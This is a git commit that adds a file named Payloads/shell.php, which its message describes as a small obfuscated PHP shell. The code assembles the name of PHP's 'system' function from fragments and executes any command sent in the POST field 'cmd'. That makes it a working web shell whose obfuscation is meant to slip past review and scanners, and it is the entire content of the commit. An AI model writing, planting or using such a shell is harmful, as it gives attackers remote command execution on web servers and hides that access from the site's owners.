a9127733f41651f45faee8492b25d6b200a1d2c6
cub3d <lmaohtp@protonmail.ch>
2016-12-22 15:35:22 +0000

    Php Shell
    Small obfuscated php shell.

---
+++ Payloads/shell.php
@@ -0,0 +1,20 @@
+<?php
+//simple shell
+define("h", "sy");
+define("d", "s");
+define("a", "te");
+define("x", "m");
+define("b", "base64_");
+define("c", "encode");
+define("p", "decode");
+
+
+$xd = b.c;
+$lol = b.p;
+$haha = h.d.a.x;
+
+$cmd = $xd($_POST["cmd"]);
+
+$haha($lol($cmd));
+
+?>
